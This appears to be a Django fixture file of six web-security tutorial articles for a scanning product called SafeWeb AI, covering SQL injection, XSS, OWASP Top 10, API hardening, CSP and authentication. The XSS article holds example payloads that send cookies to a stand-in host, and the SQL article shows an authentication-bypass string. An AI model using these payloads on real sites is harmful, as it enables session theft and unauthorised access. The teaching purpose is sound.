@@ -1,0 +1,104 @@
+[
+  {
+    "model": "learn.article",
+    "pk": "a1000000-0000-0000-0000-000000000001",
+    "fields": {
+      "title": "Understanding SQL Injection: Detection and Prevention",
+      "slug": "understanding-sql-injection",
+      "excerpt": "Learn how SQL injection attacks work, how to detect them, and implement secure coding practices to prevent them in your applications.",
+      "content": "# Understanding SQL Injection: Detection and Prevention\n\nSQL Injection (SQLi) is one of the most common and dangerous web application vulnerabilities. It occurs when an attacker can insert or \"inject\" malicious SQL code into queries that an application sends to its database.\n\n## How SQL Injection Works\n\nConsider a login form that constructs a query like:\n\n```sql\nSELECT * FROM users WHERE username = 'input_user' AND password = 'input_pass'\n```\n\nAn attacker enters `' OR '1'='1` as the username, modifying the query to:\n\n```sql\nSELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''\n```\n\nThis always evaluates to true, bypassing authentication.\n\n## Types of SQL Injection\n\n### 1. Classic (In-band) SQLi\n- **Error-based**: Exploits error messages to extract data\n- **UNION-based**: Uses UNION operator to combine results\n\n### 2. Blind SQLi\n- **Boolean-based**: Sends queries that return true/false\n- **Time-based**: Uses time delays to infer data\n\n### 3. Out-of-band SQLi\n- Uses alternative channels (DNS, HTTP) to extract data\n\n## Detection Methods\n\n1. **Input validation**: Check for SQL metacharacters\n2. **Web Application Firewall (WAF)**: Pattern matching for SQL payloads\n3. **Automated scanning**: Tools like SafeWeb AI detect injection points\n4. **Code review**: Manual inspection of query construction\n\n## Prevention Best Practices\n\n### Use Parameterized Queries\n\n```python\n# BAD - vulnerable\ncursor.execute(f\"SELECT * FROM users WHERE id = {user_id}\")\n\n# GOOD - parameterized\ncursor.execute(\"SELECT * FROM users WHERE id = %s\", [user_id])\n```\n\n### Use an ORM\n\n```python\n# Django ORM - automatically parameterized\nuser = User.objects.get(id=user_id)\n```\n\n### Additional Defenses\n- Apply least privilege to database accounts\n- Use stored procedures\n- Implement input validation (whitelist approach)\n- Keep software updated\n- Use prepared statements\n\n## CWE Reference\n- **CWE-89**: Improper Neutralization of Special Elements used in an SQL Command\n\n## OWASP Classification\n- **A03:2021 — Injection**",
+      "category": "injection",
+      "author": "Security Team",
+      "read_time": 8,
+      "image": null,
+      "is_published": true,
+      "created_at": "2025-12-18T10:00:00Z",
+      "updated_at": "2025-12-18T10:00:00Z"
+    }
+  },
+  {
+    "model": "learn.article",
+    "pk": "a1000000-0000-0000-0000-000000000002",
+    "fields": {
+      "title": "Cross-Site Scripting (XSS) Attack Patterns",
+      "slug": "xss-attack-patterns",
+      "excerpt": "Comprehensive guide to XSS vulnerabilities including reflected, stored, and DOM-based XSS with real-world examples.",
+      "content": "# Cross-Site Scripting (XSS) Attack Patterns\n\nCross-Site Scripting (XSS) is a client-side code injection attack where malicious scripts are injected into trusted websites.\n\n## Types of XSS\n\n### 1. Reflected XSS\nThe malicious script is reflected off the web server in error messages, search results, or any response that includes user input.\n\n```html\n<!-- Vulnerable search results page -->\n<p>Results for: <?php echo $_GET['q']; ?></p>\n\n<!-- Attack URL -->\nhttps://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>\n```\n\n### 2. Stored XSS\nThe malicious script is permanently stored on the target server (database, forum posts, comments).\n\n```javascript\n// Comment containing malicious code\n<img src=x onerror=\"fetch('https://evil.com/steal?c='+document.cookie)\">\n```\n\n### 3. DOM-based XSS\nThe vulnerability exists in client-side code rather than server-side.\n\n```javascript\n// Vulnerable code\ndocument.getElementById('output').innerHTML = location.hash.substring(1);\n\n// Attack URL\nhttps://example.com/page#<img src=x onerror=alert(1)>\n```\n\n## Prevention Strategies\n\n### Output Encoding\nEncode data based on the context where it appears:\n\n| Context | Encoding |\n|---------|----------|\n| HTML Body | HTML Entity Encoding |\n| HTML Attribute | Attribute Encoding |\n| JavaScript | JavaScript Encoding |\n| URL | URL Encoding |\n| CSS | CSS Encoding |\n\n### Content Security Policy (CSP)\n```\nContent-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'\n```\n\n### Additional Defenses\n- Use `textContent` instead of `innerHTML`\n- Sanitize with DOMPurify\n- Set `HttpOnly` flag on cookies\n- Implement input validation\n- Use modern frameworks with auto-escaping (React, Angular, Vue)\n\n## CWE Reference\n- **CWE-79**: Improper Neutralization of Input During Web Page Generation\n\n## OWASP Classification\n- **A03:2021 — Injection**",
+      "category": "xss",
+      "author": "Security Team",
+      "read_time": 10,
+      "image": null,
+      "is_published": true,
+      "created_at": "2025-12-15T10:00:00Z",
+      "updated_at": "2025-12-15T10:00:00Z"
+    }
+  },
+  {
+    "model": "learn.article",
+    "pk": "a1000000-0000-0000-0000-000000000003",
+    "fields": {
+      "title": "OWASP Top 10 2025: Complete Guide",
+      "slug": "owasp-top-10-complete-guide",
+      "excerpt": "Deep dive into the latest OWASP Top 10 vulnerabilities with practical examples and mitigation strategies.",
+      "content": "# OWASP Top 10 2021: Complete Guide\n\nThe OWASP Top 10 is the most widely recognized awareness document for web application security. It represents a broad consensus about the most critical security risks.\n\n## A01:2021 — Broken Access Control\n\n**What it is:** Failures in enforcing restrictions on authenticated users, allowing them to act outside their intended permissions.\n\n**Examples:**\n- Modifying URLs to access other users' data (IDOR)\n- Privilege escalation\n- Missing function-level access controls\n\n**Prevention:** Implement proper access controls, deny by default, use RBAC.\n\n## A02:2021 — Cryptographic Failures\n\n**What it is:** Failures related to cryptography that expose sensitive data.\n\n**Examples:**\n- Transmitting data in clear text (HTTP)\n- Using weak algorithms (MD5, SHA1 for passwords)\n- Missing encryption at rest\n\n**Prevention:** Use strong algorithms (AES-256, bcrypt), enforce HTTPS, protect keys.\n\n## A03:2021 — Injection\n\n**What it is:** User-supplied data is not validated and sent to an interpreter.\n\n**Types:** SQL, NoSQL, OS Command, LDAP, XSS\n\n**Prevention:** Parameterized queries, input validation, ORM usage.\n\n## A04:2021 — Insecure Design\n\n**What it is:** Flaws in the design and architecture rather than implementation.\n\n**Prevention:** Threat modeling, secure design patterns, reference architectures.\n\n## A05:2021 — Security Misconfiguration\n\n**What it is:** Missing or incorrect security configurations.\n\n**Examples:**\n- Default credentials\n- Unnecessary features enabled\n- Verbose error messages\n- Missing security headers\n\n**Prevention:** Hardening guides, automated configuration scanning.\n\n## A06:2021 — Vulnerable and Outdated Components\n\n**What it is:** Using components with known vulnerabilities.\n\n**Prevention:** Regular updates, dependency scanning, SCA tools.\n\n## A07:2021 — Identification and Authentication Failures\n\n**What it is:** Weaknesses in authentication mechanisms.\n\n**Prevention:** MFA, strong password policies, rate limiting.\n\n## A08:2021 — Software and Data Integrity Failures\n\n**What it is:** Code and infrastructure not protected against integrity violations.\n\n**Prevention:** Digital signatures, SRI for CDN resources, CI/CD security.\n\n## A09:2021 — Security Logging and Monitoring Failures\n\n**What it is:** Insufficient logging and monitoring to detect breaches.\n\n**Prevention:** Log all security events, implement alerting, incident response plan.\n\n## A10:2021 — Server-Side Request Forgery (SSRF)\n\n**What it is:** Server fetches a URL provided by the attacker.\n\n**Prevention:** Input validation, URL allowlists, block internal network access.\n\n## SafeWeb AI Coverage\n\nSafeWeb AI's scanning engine tests for all OWASP Top 10 categories. Run a scan to check your application now!",
+      "category": "best_practices",
+      "author": "Security Team",
+      "read_time": 15,
+      "image": null,
+      "is_published": true,
+      "created_at": "2025-12-12T10:00:00Z",
+      "updated_at": "2025-12-12T10:00:00Z"
+    }
+  },
+  {
+    "model": "learn.article",
+    "pk": "a1000000-0000-0000-0000-000000000004",
+    "fields": {
+      "title": "Securing REST APIs: A Comprehensive Checklist",
+      "slug": "securing-rest-apis-checklist",
+      "excerpt": "Essential security measures for API development including authentication, rate limiting, and input validation.",
+      "content": "# Securing REST APIs: A Comprehensive Checklist\n\nAPIs are the backbone of modern applications. Securing them is critical to preventing data breaches and unauthorized access.\n\n## Authentication & Authorization\n\n- [ ] Use JWT or OAuth 2.0 for authentication\n- [ ] Implement token expiration and refresh\n- [ ] Use RBAC (Role-Based Access Control)\n- [ ] Validate tokens on every request\n- [ ] Never expose credentials in URLs\n\n## Input Validation\n\n- [ ] Validate all input parameters\n- [ ] Use schema validation (JSON Schema, Pydantic)\n- [ ] Sanitize input to prevent injection\n- [ ] Implement request size limits\n- [ ] Validate content types\n\n## Rate Limiting\n\n```python\n# Django REST Framework throttling\nREST_FRAMEWORK = {\n    'DEFAULT_THROTTLE_CLASSES': [\n        'rest_framework.throttling.AnonRateThrottle',\n        'rest_framework.throttling.UserRateThrottle'\n    ],\n    'DEFAULT_THROTTLE_RATES': {\n        'anon': '100/hour',\n        'user': '1000/hour'\n    }\n}\n```\n\n## HTTPS & Transport Security\n\n- [ ] Enforce HTTPS for all endpoints\n- [ ] Use HSTS headers\n- [ ] Implement certificate pinning for mobile apps\n- [ ] Use TLS 1.2 or higher\n\n## Security Headers\n\n```\nX-Content-Type-Options: nosniff\nX-Frame-Options: DENY\nContent-Security-Policy: default-src 'self'\nStrict-Transport-Security: max-age=31536000\nX-XSS-Protection: 0\n```\n\n## Error Handling\n\n- [ ] Never expose stack traces in production\n- [ ] Use generic error messages\n- [ ] Log errors server-side with context\n- [ ] Return appropriate HTTP status codes\n\n## Data Protection\n\n- [ ] Encrypt sensitive data at rest\n- [ ] Use field-level encryption for PII\n- [ ] Implement data masking in responses\n- [ ] Follow the principle of least privilege\n\n## CORS Configuration\n\n```python\n# Only allow specific origins\nCORS_ALLOWED_ORIGINS = [\n    'https://yourdomain.com',\n]\nCORS_ALLOW_CREDENTIALS = True\n```\n\n## Logging & Monitoring\n\n- [ ] Log all authentication attempts\n- [ ] Monitor for unusual patterns\n- [ ] Set up alerts for security events\n- [ ] Implement request tracing\n\n## Additional Best Practices\n\n- Use API versioning\n- Implement request/response signing\n- Document security requirements\n- Regular security audits and penetration testing\n- Use API gateways for centralized security",
+      "category": "api_security",
+      "author": "Security Team",
+      "read_time": 12,
+      "image": null,
+      "is_published": true,
+      "created_at": "2025-12-10T10:00:00Z",
+      "updated_at": "2025-12-10T10:00:00Z"
+    }
+  },
+  {
+    "model": "learn.article",
+    "pk": "a1000000-0000-0000-0000-000000000005",
+    "fields": {
+      "title": "Implementing Content Security Policy (CSP)",
+      "slug": "implementing-content-security-policy",
+      "excerpt": "Step-by-step guide to implementing CSP headers to prevent XSS attacks and data injection.",
+      "content": "# Implementing Content Security Policy (CSP)\n\nContent Security Policy is a powerful HTTP response header that helps prevent XSS attacks, data injection, and clickjacking.\n\n## What is CSP?\n\nCSP tells the browser which sources of content are trusted. If a script tries to load from an untrusted source, the browser blocks it.\n\n## Basic CSP Header\n\n```\nContent-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;\n```\n\n## CSP Directives\n\n| Directive | Purpose |\n|-----------|--------|\n| `default-src` | Fallback for other directives |\n| `script-src` | Controls JavaScript sources |\n| `style-src` | Controls CSS sources |\n| `img-src` | Controls image sources |\n| `font-src` | Controls font sources |\n| `connect-src` | Controls XHR/fetch/WebSocket |\n| `frame-src` | Controls iframe sources |\n| `object-src` | Controls plugins |\n| `base-uri` | Controls <base> element |\n| `form-action` | Controls form submissions |\n\n## Implementation Steps\n\n### Step 1: Start with Report-Only\n\n```\nContent-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report\n```\n\nThis logs violations without blocking content.\n\n### Step 2: Analyze Reports\n\nCollect and analyze CSP violation reports to identify legitimate resources.\n\n### Step 3: Build Your Policy\n\nStart restrictive and add sources as needed:\n\n```python\n# Django middleware\nclass CSPMiddleware:\n    def __init__(self, get_response):\n        self.get_response = get_response\n\n    def __call__(self, request):\n        response = self.get_response(request)\n        response['Content-Security-Policy'] = (\n            \"default-src 'self'; \"\n            \"script-src 'self'; \"\n            \"style-src 'self' 'unsafe-inline'; \"\n            \"img-src 'self' data: https:; \"\n            \"font-src 'self' https://fonts.gstatic.com; \"\n            \"connect-src 'self' https://api.yourdomain.com; \"\n            \"frame-ancestors 'none'; \"\n            \"base-uri 'self'; \"\n            \"form-action 'self'\"\n        )\n        return response\n```\n\n### Step 4: Use Nonces for Inline Scripts\n\n```html\n<script nonce=\"random123\">console.log('allowed')</script>\n```\n\n```\nContent-Security-Policy: script-src 'nonce-random123'\n```\n\n## Common Mistakes\n\n1. Using `'unsafe-inline'` for scripts (defeats XSS protection)\n2. Using `'unsafe-eval'` (allows eval())\n3. Overly permissive wildcards like `*.example.com`\n4. Forgetting `frame-ancestors` (clickjacking)\n5. Not using `upgrade-insecure-requests`\n\n## Testing Your CSP\n\n- Use browser DevTools Console to see violations\n- Use [CSP Evaluator](https://csp-evaluator.withgoogle.com/)\n- Run a SafeWeb AI scan to check your headers",
+      "category": "security_headers",
+      "author": "Security Team",
+      "read_time": 9,
+      "image": null,
+      "is_published": true,
+      "created_at": "2025-12-08T10:00:00Z",
+      "updated_at": "2025-12-08T10:00:00Z"
+    }
+  },
+  {
+    "model": "learn.article",
+    "pk": "a1000000-0000-0000-0000-000000000006",
+    "fields": {
+      "title": "Authentication Best Practices in 2025",
+      "slug": "authentication-best-practices",
+      "excerpt": "Modern authentication strategies including MFA, OAuth 2.0, and passwordless authentication.",
+      "content": "# Authentication Best Practices in 2025\n\nAuthentication is the first line of defense for any application. Modern threats require modern authentication strategies.\n\n## Password Security\n\n### Password Requirements\n- Minimum 8 characters (NIST recommends up to 64)\n- Check against breached password databases\n- Don't enforce complex composition rules (NIST 800-63B)\n- Allow paste in password fields\n\n### Password Storage\n\n```python\n# Use bcrypt or Argon2\nfrom django.contrib.auth.hashers import make_password\nhashed = make_password(password)  # Django uses PBKDF2 by default\n\n# Better: use Argon2\n# settings.py\nPASSWORD_HASHERS = [\n    'django.contrib.auth.hashers.Argon2PasswordHasher',\n    'django.contrib.auth.hashers.PBKDF2PasswordHasher',\n]\n```\n\n## Multi-Factor Authentication (MFA)\n\n### TOTP (Time-based One-Time Password)\n\n```python\nimport pyotp\n\n# Generate secret\nsecret = pyotp.random_base32()\n\n# Generate QR code URL\ntotp = pyotp.TOTP(secret)\nuri = totp.provisioning_uri(user.email, issuer_name='SafeWeb AI')\n\n# Verify token\nis_valid = totp.verify(user_token)\n```\n\n### Recovery Codes\n- Generate 10 backup codes during setup\n- Store hashed, mark as used after single use\n- Allow regeneration\n\n## OAuth 2.0 / OpenID Connect\n\n### Authorization Code Flow (recommended)\n1. Redirect user to provider\n2. User authenticates and consents\n3. Provider redirects back with auth code\n4. Exchange code for tokens\n5. Use access token for API calls\n\n### Security Considerations\n- Always use PKCE for public clients\n- Validate state parameter to prevent CSRF\n- Use short-lived access tokens\n- Implement token rotation for refresh tokens\n\n## JWT Best Practices\n\n```python\nSIMPLE_JWT = {\n    'ACCESS_TOKEN_LIFETIME': timedelta(minutes=15),  # Short-lived\n    'REFRESH_TOKEN_LIFETIME': timedelta(days=7),\n    'ROTATE_REFRESH_TOKENS': True,\n    'BLACKLIST_AFTER_ROTATION': True,\n    'ALGORITHM': 'HS256',\n}\n```\n\n### JWT Security Rules\n- Never store sensitive data in JWT payload\n- Use short expiration times (15-60 minutes)\n- Implement token blacklisting for logout\n- Validate all claims (iss, aud, exp)\n- Use HTTPS to prevent token interception\n\n## Session Management\n\n- Set secure cookie flags: `Secure`, `HttpOnly`, `SameSite=Lax`\n- Implement session timeout (idle and absolute)\n- Regenerate session ID after login\n- Invalidate sessions on password change\n\n## Rate Limiting Login Attempts\n\n```python\nfrom django.core.cache import cache\n\ndef check_rate_limit(email):\n    key = f'login_attempts:{email}'\n    attempts = cache.get(key, 0)\n    if attempts >= 5:\n        return False  # Too many attempts\n    cache.set(key, attempts + 1, timeout=300)  # 5 min window\n    return True\n```\n\n## Passwordless Authentication\n\n### Magic Links\n- Send one-time login link via email\n- Token expires in 10-15 minutes\n- Single use only\n\n### WebAuthn / Passkeys\n- Hardware key support (YubiKey)\n- Biometric authentication\n- Phishing-resistant\n- Growing browser support\n\n## Checklist\n\n- [ ] Implement MFA\n- [ ] Use bcrypt/Argon2 for password hashing\n- [ ] Rate limit authentication endpoints\n- [ ] Implement account lockout\n- [ ] Use secure session management\n- [ ] Log all authentication events\n- [ ] Support password managers",
+      "category": "authentication",
+      "author": "Security Team",
+      "read_time": 11,
+      "image": null,
+      "is_published": true,
+      "created_at": "2025-12-05T10:00:00Z",
+      "updated_at": "2025-12-05T10:00:00Z"
+    }
+  }
+]
